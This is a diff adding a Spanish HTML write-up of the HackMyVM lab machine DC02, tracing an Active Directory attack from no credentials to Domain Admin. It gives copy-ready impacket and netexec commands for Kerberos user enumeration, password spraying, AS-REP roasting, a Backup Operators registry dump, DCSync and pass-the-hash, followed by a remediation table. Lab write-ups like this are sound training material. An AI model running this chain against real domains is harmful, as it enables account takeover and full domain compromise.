@@ -1,0 +1,417 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DC02 · HackMyVM · W4lterSec</title>
+<meta name="author" content="W4lterSec" />
+<meta name="description" content="Writeup de explotación de Active Directory: de cero credenciales a Domain Admin en DC01.SOUPEDECODE.LOCAL" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<style>
+:root{
+  --green:#00FF41; --green-dim:#0bbd31; --red:#FF3333; --amber:#ffb627;
+  --bg:#000000; --bg2:#070b08; --card:#0C130E; --card2:#0a0f0b;
+  --fg:#E0E0E0; --muted:#94A3B8; --border:#1F2A1F; --ring:#00FF41;
+  --mono:'JetBrains Mono',ui-monospace,monospace; --sans:'IBM Plex Sans',system-ui,sans-serif;
+  --space-1:8px; --space-2:16px; --space-3:24px; --space-4:40px; --space-5:64px; --space-6:96px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0; background:var(--bg); color:var(--fg); font-family:var(--sans);
+  line-height:1.6; overflow-x:hidden; -webkit-font-smoothing:antialiased;
+}
+/* ---------- background layers ---------- */
+#matrix{position:fixed; inset:0; z-index:0; opacity:.14; pointer-events:none}
+.aurora{position:fixed; inset:-20% -20% auto -20%; height:70vh; z-index:0; pointer-events:none;
+  background:radial-gradient(60% 60% at 30% 20%, rgba(0,255,65,.14), transparent 60%),
+             radial-gradient(50% 50% at 80% 10%, rgba(255,51,51,.10), transparent 60%);
+  filter:blur(40px); animation:drift 18s ease-in-out infinite alternate}
+@keyframes drift{from{transform:translate3d(-3%,-2%,0) scale(1)}to{transform:translate3d(4%,3%,0) scale(1.12)}}
+.scanlines{position:fixed; inset:0; z-index:40; pointer-events:none; mix-blend-mode:overlay; opacity:.5;
+  background:repeating-linear-gradient(to bottom, rgba(255,255,255,.035) 0 1px, transparent 1px 3px)}
+#spot{position:fixed; width:480px; height:480px; z-index:1; pointer-events:none; left:0; top:0;
+  background:radial-gradient(circle, rgba(0,255,65,.08), transparent 65%); transform:translate(-50%,-50%); transition:opacity .4s}
+main{position:relative; z-index:2}
+/* ---------- layout ---------- */
+.wrap{max-width:1040px; margin:0 auto; padding:0 var(--space-2)}
+section{padding:var(--space-6) 0}
+.eyebrow{font-family:var(--mono); color:var(--green); letter-spacing:.28em; text-transform:uppercase; font-size:12px; margin:0 0 var(--space-2)}
+h2{font-family:var(--mono); font-size:clamp(24px,4vw,38px); margin:0 0 var(--space-3); font-weight:700; line-height:1.15}
+h2 .hash{color:var(--green-dim)}
+h3{font-family:var(--mono); font-size:19px; color:#fff; margin:var(--space-3) 0 var(--space-1)}
+p{color:#c6d3c6; margin:0 0 var(--space-2)}
+a{color:var(--green)}
+.muted{color:var(--muted)}
+/* ---------- hero ---------- */
+.hero{min-height:100vh; display:flex; flex-direction:column; justify-content:center; padding-top:var(--space-5)}
+.statusbar{font-family:var(--mono); font-size:12px; color:var(--muted); display:flex; gap:var(--space-2); flex-wrap:wrap; margin-bottom:var(--space-4)}
+.statusbar b{color:var(--green)}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--green);display:inline-block;box-shadow:0 0 10px var(--green);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.glitch{font-family:var(--mono); font-weight:700; font-size:clamp(40px,9vw,94px); line-height:.95; margin:0; position:relative; color:#fff; letter-spacing:-2px}
+.glitch::before,.glitch::after{content:attr(data-text); position:absolute; inset:0; clip-path:inset(0); opacity:.85}
+.glitch::before{color:var(--green); transform:translate(-2px,0); animation:gl1 3.2s infinite linear alternate}
+.glitch::after{color:var(--red); transform:translate(2px,0); animation:gl2 2.6s infinite linear alternate}
+@keyframes gl1{0%,92%,100%{clip-path:inset(0 0 100% 0)}93%{clip-path:inset(10% 0 60% 0)}96%{clip-path:inset(40% 0 20% 0)}}
+@keyframes gl2{0%,90%,100%{clip-path:inset(100% 0 0 0)}91%{clip-path:inset(60% 0 20% 0)}95%{clip-path:inset(20% 0 55% 0)}}
+.sub{font-size:clamp(16px,2.4vw,22px); color:#aeb9ae; max-width:640px; margin-top:var(--space-3)}
+.sub .tag{color:var(--green)}
+.herometa{display:flex; gap:var(--space-3); flex-wrap:wrap; margin-top:var(--space-4); font-family:var(--mono); font-size:13px}
+.herometa span{border:1px solid var(--border); padding:8px 14px; border-radius:8px; background:rgba(12,19,14,.6); backdrop-filter:blur(4px)}
+.scrollcue{margin-top:var(--space-5); font-family:var(--mono); font-size:12px; color:var(--muted); display:flex; align-items:center; gap:10px}
+.scrollcue svg{animation:bob 1.8s infinite}
+@keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(6px)}}
+/* ---------- cards / flags ---------- */
+.grid{display:grid; gap:var(--space-2)}
+.flags{grid-template-columns:1fr 1fr}
+.flagcard{position:relative; border:1px solid var(--border); border-radius:14px; padding:var(--space-3); background:linear-gradient(160deg,var(--card),var(--card2)); overflow:hidden}
+.flagcard::before{content:""; position:absolute; inset:0; border-radius:14px; padding:1px;
+  background:linear-gradient(130deg,var(--green),transparent 40%,transparent 60%,var(--red));
+  -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+  -webkit-mask-composite:xor; mask-composite:exclude; opacity:.6}
+.flagcard .lbl{font-family:var(--mono); font-size:12px; letter-spacing:.2em; text-transform:uppercase; color:var(--muted)}
+.flagcard .who{font-family:var(--mono); color:var(--green); font-size:14px; margin-top:6px}
+.flagcard .val{font-family:var(--mono); font-size:clamp(15px,2.6vw,21px); color:#fff; margin-top:12px; word-break:break-all;
+  text-shadow:0 0 14px rgba(0,255,65,.45)}
+.flagcard.root .who{color:var(--red)} .flagcard.root .val{text-shadow:0 0 14px rgba(255,51,51,.45)}
+/* ---------- recon table ---------- */
+.ports{grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); margin-top:var(--space-2)}
+.port{border:1px solid var(--border); border-radius:10px; padding:12px 14px; background:var(--card); font-family:var(--mono); font-size:13px}
+.port b{color:var(--green); font-size:16px}
+.port span{display:block; color:var(--muted); margin-top:3px; font-size:12px}
+/* ---------- timeline ---------- */
+.timeline{position:relative; margin-top:var(--space-4); padding-left:var(--space-4)}
+.timeline::before{content:""; position:absolute; left:14px; top:6px; bottom:6px; width:2px;
+  background:linear-gradient(var(--green),var(--green-dim),var(--red))}
+.step{position:relative; margin-bottom:var(--space-4); opacity:1}
+.step .node{position:absolute; left:calc(-1 * var(--space-4) + 5px); top:2px; width:20px; height:20px; border-radius:50%;
+  background:var(--bg); border:2px solid var(--green); box-shadow:0 0 0 4px rgba(0,255,65,.12)}
+.step.crit .node{border-color:var(--red); box-shadow:0 0 0 4px rgba(255,51,51,.14)}
+.step .k{font-family:var(--mono); font-size:12px; color:var(--green); letter-spacing:.18em; text-transform:uppercase}
+.step.crit .k{color:var(--red)}
+.step h3{margin-top:4px}
+.badge{display:inline-block; font-family:var(--mono); font-size:11px; padding:3px 9px; border-radius:999px; border:1px solid var(--border); color:var(--muted); margin-left:8px; vertical-align:middle}
+.badge.win{color:var(--green); border-color:rgba(0,255,65,.35)}
+.badge.priv{color:var(--red); border-color:rgba(255,51,51,.35)}
+/* ---------- terminal ---------- */
+.term{border:1px solid var(--border); border-radius:12px; background:#05080600; background:rgba(5,8,6,.85); margin:var(--space-2) 0; overflow:hidden; backdrop-filter:blur(2px)}
+.term .bar{display:flex; align-items:center; gap:8px; padding:10px 14px; background:#0a100b; border-bottom:1px solid var(--border)}
+.term .bar i{width:11px;height:11px;border-radius:50%;display:inline-block}
+.term .bar i:nth-child(1){background:#ff5f56} .term .bar i:nth-child(2){background:#ffbd2e} .term .bar i:nth-child(3){background:#27c93f}
+.term .bar .t{margin-left:8px; font-family:var(--mono); font-size:12px; color:var(--muted)}
+.term .bar button{margin-left:auto; background:transparent; border:1px solid var(--border); color:var(--muted); font-family:var(--mono);
+  font-size:11px; padding:4px 10px; border-radius:6px; cursor:pointer; transition:all .18s}
+.term .bar button:hover{color:var(--green); border-color:var(--green)}
+.term pre{margin:0; padding:16px; overflow-x:auto; font-family:var(--mono); font-size:13px; line-height:1.7; color:#d7e6d7}
+.term pre .c{color:#5f7a5f} .term pre .p{color:var(--green)} .term pre .o{color:var(--amber)} .term pre .hl{color:#fff; background:rgba(0,255,65,.12)}
+.result{font-family:var(--mono); font-size:13px; color:var(--green); border-left:2px solid var(--green); padding:8px 14px; margin:var(--space-1) 0 var(--space-2); background:rgba(0,255,65,.04)}
+.result.bad{color:var(--red); border-color:var(--red); background:rgba(255,51,51,.04)}
+/* ---------- remediation ---------- */
+table.rem{width:100%; border-collapse:collapse; margin-top:var(--space-2); font-size:14px}
+table.rem th,table.rem td{text-align:left; padding:12px 14px; border-bottom:1px solid var(--border); vertical-align:top}
+table.rem th{font-family:var(--mono); font-size:12px; letter-spacing:.12em; text-transform:uppercase; color:var(--muted)}
+.risk{font-family:var(--mono); font-size:12px; padding:3px 9px; border-radius:6px; white-space:nowrap}
+.risk.c{color:var(--red); background:rgba(255,51,51,.12)} .risk.h{color:var(--amber); background:rgba(255,182,39,.12)} .risk.m{color:var(--green); background:rgba(0,255,65,.1)}
+/* ---------- chain summary ---------- */
+.chain{font-family:var(--mono); font-size:14px; line-height:2.2; color:#cfe}
+.chain .n{color:var(--green)} .chain .arr{color:var(--red); margin:0 6px}
+/* ---------- footer ---------- */
+footer{border-top:1px solid var(--border); padding:var(--space-4) 0; text-align:center; font-family:var(--mono); font-size:12px; color:var(--muted)}
+/* reveal default */
+.reveal{opacity:1}
+@media (max-width:720px){ .flags{grid-template-columns:1fr} section{padding:var(--space-5) 0} }
+@media (prefers-reduced-motion:reduce){
+  *{animation:none !important}
+  .reveal,.step{opacity:1 !important; transform:none !important}
+  .glitch::before,.glitch::after{display:none}
+  html{scroll-behavior:auto}
+}
+
+.portfolio-nav{display:flex;flex-wrap:wrap;align-items:center;gap:12px 20px;margin-bottom:36px;font:12px var(--mono)}
+.portfolio-nav span{color:var(--muted)}
+.portfolio-nav a{text-decoration:none}.portfolio-nav a:hover{text-decoration:underline}
+.machine-links{display:flex;flex-wrap:wrap;gap:12px 24px;margin-top:28px;font:13px var(--mono)}
+.table-scroll{overflow-x:auto}table.rem{min-width:580px}
+@media print{#matrix,.aurora,#spot,.scanlines,.scrollcue{display:none!important}.hero{min-height:auto}section{padding:24px 0}.reveal,.step{opacity:1!important;transform:none!important}}
+</style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="aurora"></div>
+<div id="spot"></div>
+<div class="scanlines"></div>
+
+<main>
+  <!-- HERO -->
+  <header class="hero wrap">
+    <nav class="portfolio-nav" aria-label="Navegación del portfolio">
+      <a href="https://github.com/W4lterSec/cybersecurity-labs/tree/main/red-team">← Red Team</a>
+      <span>W4lterSec · HackMyVM · DC02 completada</span>
+      <a href="https://hackmyvm.eu/machine/DC02" target="_blank" rel="noopener noreferrer">Máquina oficial ↗</a>
+    </nav>
+    <div class="statusbar">
+      <span><span class="dot"></span> LABORATORIO COMPLETADO</span>
+      <span>IP <b>192.168.1.23</b></span>
+      <span>HOST <b>DC01</b></span>
+      <span>DOMAIN <b>SOUPEDECODE.LOCAL</b></span>
+      <span>OS <b>Win Server 2022</b></span>
+    </div>
+    <p class="eyebrow">// DC01 · SOUPEDECODE.LOCAL</p>
+    <h1 class="glitch" data-text="DC02">DC02</h1>
+    <p class="sub">De <span class="tag">cero credenciales</span> a <span class="tag">Domain Admin</span>. Cadena de ataque completa sobre un Controlador de Dominio de Active Directory.</p>
+    <div class="herometa">
+      <span>⬡ Active Directory</span>
+      <span>⬡ Kerberos Enum</span>
+      <span>⬡ AS-REP Roast</span>
+      <span>⬡ Backup Operators</span>
+      <span>⬡ DCSync · PTH</span>
+    </div>
+    <div class="scrollcue">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00FF41" stroke-width="2"><path d="M12 5v14M6 13l6 6 6-6"/></svg>
+      scroll para iniciar el recorrido
+    </div>
+  </header>
+
+  <!-- FLAGS -->
+  <section class="wrap">
+    <p class="eyebrow reveal">// objetivo capturado</p>
+    <h2 class="reveal"><span class="hash">#</span> Flags</h2>
+    <div class="grid flags">
+      <div class="flagcard reveal">
+        <div class="lbl">User Flag</div>
+        <div class="who">● zximena448 — Backup Operators</div>
+        <div class="val">2fe79eb0e02ecd4dd2833cfcbbdb504c</div>
+      </div>
+      <div class="flagcard root reveal">
+        <div class="lbl">Root Flag</div>
+        <div class="who">● Administrator — Domain Admin</div>
+        <div class="val">d41d8cd98f00b204e9800998ecf8427e</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RECON -->
+  <section class="wrap">
+    <p class="eyebrow reveal">// fase 01</p>
+    <h2 class="reveal"><span class="hash">#</span> Reconocimiento</h2>
+    <p class="reveal">El escaneo completo de puertos revela el set de servicios inconfundible de un <b>Domain Controller</b>: Kerberos, LDAP, DNS, SMB y ADWS.</p>
+    <div class="term reveal">
+      <div class="bar"><i></i><i></i><i></i><span class="t">nmap — port sweep</span><button data-copy="nmap -p- --open -sT --min-rate 5000 -n -Pn -T4 192.168.1.23">copy</button></div>
+      <pre><span class="c"># barrido completo de 65535 puertos TCP</span>
+<span class="p">$</span> nmap -p- --open -sT --min-rate 5000 -n -Pn -T4 <span class="o">192.168.1.23</span></pre>
+    </div>
+    <div class="grid ports reveal">
+      <div class="port"><b>53</b> DNS<span>Simple DNS Plus</span></div>
+      <div class="port"><b>88</b> Kerberos<span>auth del dominio</span></div>
+      <div class="port"><b>389</b> LDAP<span>SOUPEDECODE.LOCAL</span></div>
+      <div class="port"><b>445</b> SMB<span>signing requerido</span></div>
+      <div class="port"><b>5985</b> WinRM<span>remoting</span></div>
+      <div class="port"><b>9389</b> ADWS<span>AD Web Services</span></div>
+      <div class="port"><b>3268</b> GC<span>Global Catalog</span></div>
+      <div class="port"><b>636</b> LDAPS<span>LDAP sobre TLS</span></div>
+    </div>
+  </section>
+
+  <!-- ATTACK CHAIN TIMELINE -->
+  <section class="wrap">
+    <p class="eyebrow reveal">// cadena de explotación</p>
+    <h2 class="reveal"><span class="hash">#</span> Kill Chain</h2>
+    <div class="timeline">
+
+      <div class="step">
+        <div class="node"></div>
+        <div class="k">Fase 02 · Enumeración</div>
+        <h3>Usuarios vía Kerberos <span class="badge">sin credenciales</span></h3>
+        <p>Accesos anónimos bloqueados (guest disabled, null session denegada). Se enumeran usuarios válidos abusando de los errores de pre-auth Kerberos.</p>
+        <div class="term">
+          <div class="bar"><i></i><i></i><i></i><span class="t">impacket-GetNPUsers — user enum</span><button data-copy="impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass -usersfile usernames.txt -dc-ip 192.168.1.23">copy</button></div>
+          <pre><span class="p">$</span> impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass \
+    -usersfile usernames.txt -dc-ip <span class="o">192.168.1.23</span></pre>
+        </div>
+        <div class="result">[+] Usuarios válidos → admin · charlie</div>
+      </div>
+
+      <div class="step">
+        <div class="node"></div>
+        <div class="k">Fase 03 · Acceso inicial</div>
+        <h3>Password Spraying <span class="badge win">charlie:charlie</span></h3>
+        <p>Patrón clásico de laboratorios AD: <b>contraseña = nombre de usuario</b>.</p>
+        <div class="term">
+          <div class="bar"><i></i><i></i><i></i><span class="t">netexec — spray user==pass</span><button data-copy="nxc smb 192.168.1.23 -u users.txt -p users.txt --no-bruteforce --continue-on-success">copy</button></div>
+          <pre><span class="p">$</span> nxc smb 192.168.1.23 -u users.txt -p users.txt \
+    --no-bruteforce --continue-on-success</pre>
+        </div>
+        <div class="result">[+] SOUPEDECODE.LOCAL\charlie:charlie — 964 usuarios del dominio volcados</div>
+      </div>
+
+      <div class="step">
+        <div class="node"></div>
+        <div class="k">Fase 04 · Movimiento lateral</div>
+        <h3>AS-REP Roasting <span class="badge win">zximena448:internet</span></h3>
+        <p>Con los 964 usuarios se busca pre-auth deshabilitada; el hash AS-REP se crackea offline con rockyou.</p>
+        <div class="term">
+          <div class="bar"><i></i><i></i><i></i><span class="t">GetNPUsers + john</span><button data-copy="impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass -usersfile full_users.txt -dc-ip 192.168.1.23; john asrep.txt --wordlist=rockyou.txt">copy</button></div>
+          <pre><span class="p">$</span> impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass -usersfile full_users.txt -dc-ip 192.168.1.23
+<span class="o">$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:646b6dbf...</span>
+<span class="p">$</span> john asrep.txt --wordlist=rockyou.txt</pre>
+        </div>
+        <div class="result">[+] zximena448 : internet</div>
+      </div>
+
+      <div class="step crit">
+        <div class="node"></div>
+        <div class="k">Fase 05 · Escalada</div>
+        <h3>Backup Operators → dump del registro <span class="badge priv">SeBackupPrivilege</span></h3>
+        <p><b>zximena448</b> pertenece al grupo <b>Backup Operators</b>, lo que permite leer cualquier fichero del DC y volcar las ramas del registro. De ahí se extrae el hash de la cuenta máquina <b>DC01$</b>.</p>
+        <div class="term">
+          <div class="bar"><i></i><i></i><i></i><span class="t">netexec — backup_operator module</span><button data-copy="nxc smb 192.168.1.23 -u zximena448 -p internet -M backup_operator">copy</button></div>
+          <pre><span class="p">$</span> nxc ldap 192.168.1.23 -u zximena448 -p internet --query "(sAMAccountName=zximena448)" memberOf
+<span class="o">memberOf: CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL   (Pwn3d!)</span>
+<span class="p">$</span> nxc smb 192.168.1.23 -u zximena448 -p internet -M <span class="hl">backup_operator</span></pre>
+        </div>
+        <div class="result bad">[+] SOUPEDECODE\DC01$ ::: cff4505c0cfd1e9651471ffee912cd76</div>
+      </div>
+
+      <div class="step crit">
+        <div class="node"></div>
+        <div class="k">Fase 06 · DCSync</div>
+        <h3>Replicación con la cuenta máquina <span class="badge priv">DC01$</span></h3>
+        <p>Las cuentas de equipo de un DC poseen derechos de replicación del directorio — suficientes para un <b>DCSync</b> que extrae el hash del Administrator del dominio.</p>
+        <div class="term">
+          <div class="bar"><i></i><i></i><i></i><span class="t">impacket-secretsdump — DCSync</span><button data-copy="impacket-secretsdump 'SOUPEDECODE.LOCAL/DC01$@192.168.1.23' -hashes :cff4505c0cfd1e9651471ffee912cd76 -just-dc-user Administrator">copy</button></div>
+          <pre><span class="p">$</span> impacket-secretsdump 'SOUPEDECODE.LOCAL/DC01$@192.168.1.23' \
+    -hashes :cff4505c0cfd1e9651471ffee912cd76 -just-dc-user Administrator</pre>
+        </div>
+        <div class="result bad">[+] Administrator:500:...:8982babd4da89d33210779a6c5b078bd:::</div>
+      </div>
+
+      <div class="step crit">
+        <div class="node"></div>
+        <div class="k">Fase 07 · Compromiso total</div>
+        <h3>Pass-the-Hash <span class="badge priv">Domain Admin</span></h3>
+        <p>Autenticación como Administrator con el hash NT — control total del Controlador de Dominio.</p>
+        <div class="term">
+          <div class="bar"><i></i><i></i><i></i><span class="t">netexec — pass-the-hash</span><button data-copy="nxc smb 192.168.1.23 -u Administrator -H 8982babd4da89d33210779a6c5b078bd">copy</button></div>
+          <pre><span class="p">$</span> nxc smb 192.168.1.23 -u Administrator -H <span class="hl">8982babd4da89d33210779a6c5b078bd</span></pre>
+        </div>
+        <div class="result bad">[+] SOUPEDECODE.LOCAL\Administrator (Pwn3d!) — root.txt capturada</div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- REMEDIATION -->
+  <section class="wrap">
+    <p class="eyebrow reveal">// defensa</p>
+    <h2 class="reveal"><span class="hash">#</span> Remediación</h2>
+    <div class="table-scroll"><table class="rem reveal">
+      <thead><tr><th>Hallazgo</th><th>Riesgo</th><th>Recomendación</th></tr></thead>
+      <tbody>
+        <tr><td>Contraseñas <code>usuario==contraseña</code> (charlie)</td><td><span class="risk c">Crítico</span></td><td>Política de contraseñas robusta, lockout y detección de spraying</td></tr>
+        <tr><td>Pre-auth Kerberos deshabilitada (zximena448)</td><td><span class="risk h">Alto</span></td><td>Habilitar pre-auth; auditar flag <code>DONT_REQ_PREAUTH</code></td></tr>
+        <tr><td>Contraseña débil en rockyou (<code>internet</code>)</td><td><span class="risk h">Alto</span></td><td>Longitud 14+, listas de bloqueo de contraseñas comunes</td></tr>
+        <tr><td>Usuario normal en <b>Backup Operators</b></td><td><span class="risk c">Crítico</span></td><td>Retirar; tratar el grupo como Tier-0; revisar grupos privilegiados</td></tr>
+        <tr><td>Enumeración de usuarios por Kerberos</td><td><span class="risk m">Medio</span></td><td>Reforzar lockout y monitorizar eventos 4768 / 4625</td></tr>
+      </tbody>
+    </table></div>
+  </section>
+
+  <!-- CHAIN SUMMARY -->
+  <section class="wrap">
+    <p class="eyebrow reveal">// tl;dr</p>
+    <h2 class="reveal"><span class="hash">#</span> Cadena resumida</h2>
+    <div class="term reveal">
+      <div class="bar"><i></i><i></i><i></i><span class="t">attack-chain.log</span></div>
+      <pre class="chain"><span class="n">nmap</span><span class="arr">→</span>Kerberos user-enum<span class="arr">→</span><span class="n">spray</span> (charlie:charlie)
+<span class="arr">→</span>964 users<span class="arr">→</span><span class="n">AS-REP roast</span> (zximena448)<span class="arr">→</span>john (internet)
+<span class="arr">→</span><span class="n">Backup Operators</span><span class="arr">→</span>dump registry hives<span class="arr">→</span>DC01$ hash
+<span class="arr">→</span><span class="n">DCSync</span><span class="arr">→</span>Administrator NT hash<span class="arr">→</span><span class="n">Pass-the-Hash</span><span class="arr">→</span>DA</pre>
+    </div>
+  </section>
+
+  <footer class="wrap">
+    <div class="machine-links"><a href="https://w4ltersec.github.io/cybersecurity-labs/red-team/hackmyvm/dc02/DC02-Writeup.html">DC02 · Writeup visual</a><a href="https://hackmyvm.eu/machine/DC02" target="_blank" rel="noopener noreferrer">Abrir DC02 en HackMyVM ↗</a></div>
+    W4lterSec · DC02 · SOUPEDECODE.LOCAL · 192.168.1.23 · writeup generado 2026-11-17 · uso exclusivo en laboratorio autorizado
+  </footer>
+</main>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.13.0/gsap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.13.0/ScrollTrigger.min.js"></script>
+<script>
+(function(){
+  "use strict";
+  var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  /* ---- Matrix digital rain ---- */
+  var cv = document.getElementById('matrix'), ctx = cv.getContext('2d');
+  var cols, drops, fontSize = 14;
+  var glyphs = 'ァアカサタナハマヤラ0123456789ABCDEF<>/\\$#@'.split('');
+  function sizeCanvas(){
+    cv.width = window.innerWidth; cv.height = window.innerHeight;
+    cols = Math.floor(cv.width / fontSize);
+    drops = new Array(cols).fill(1);
+  }
+  sizeCanvas();
+  function rain(){
+    ctx.fillStyle = 'rgba(0,0,0,0.08)';
+    ctx.fillRect(0,0,cv.width,cv.height);
+    ctx.fillStyle = '#00FF41';
+    ctx.font = fontSize + "px 'JetBrains Mono', monospace";
+    for(var i=0;i<drops.length;i++){
+      var ch = glyphs[Math.floor(Math.random()*glyphs.length)];
+      ctx.fillText(ch, i*fontSize, drops[i]*fontSize);
+      if(drops[i]*fontSize > cv.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  var rainTimer;
+  if(!reduce){ rainTimer = setInterval(rain, 55); }
+  window.addEventListener('resize', sizeCanvas);
+
+  /* ---- spotlight follows cursor ---- */
+  var spot = document.getElementById('spot');
+  if(window.gsap && !reduce && window.matchMedia('(pointer:fine)').matches){
+    window.addEventListener('pointermove', function(e){
+      spot.style.opacity = 1;
+      gsap.to(spot, {x:e.clientX, y:e.clientY, duration:.5, ease:'power2.out', overwrite:true});
+    });
+  } else { spot.style.display='none'; }
+
+  /* ---- copy buttons ---- */
+  document.querySelectorAll('button[data-copy]').forEach(function(b){
+    b.addEventListener('click', function(){
+      navigator.clipboard.writeText(b.getAttribute('data-copy')).then(function(){
+        var o = b.textContent; b.textContent = '✓ copiado';
+        setTimeout(function(){ b.textContent = o; }, 1400);
+      });
+    });
+  });
+
+  /* ---- GSAP scroll reveals ---- */
+  if(window.gsap && window.ScrollTrigger && !reduce){
+    gsap.registerPlugin(ScrollTrigger);
+    gsap.utils.toArray('.reveal').forEach(function(el){
+      gsap.fromTo(el, {opacity:0, y:22}, {
+        opacity:1, y:0, duration:.5, ease:'power2.out',
+        scrollTrigger:{trigger:el, start:'top 88%', toggleActions:'play none none reverse'}
+      });
+    });
+    gsap.utils.toArray('.step').forEach(function(el){
+      gsap.fromTo(el, {opacity:0, x:-24}, {
+        opacity:1, x:0, duration:.55, ease:'expo.out',
+        scrollTrigger:{trigger:el, start:'top 85%', toggleActions:'play none none reverse'}
+      });
+      var node = el.querySelector('.node');
+      gsap.fromTo(node, {scale:0}, {scale:1, duration:.4, ease:'back.out(2)',
+        scrollTrigger:{trigger:el, start:'top 85%'}});
+    });
+  } else {
+    document.querySelectorAll('.reveal,.step').forEach(function(el){ el.style.opacity=1; });
+  }
+})();
+</script>
+</body>
+</html>
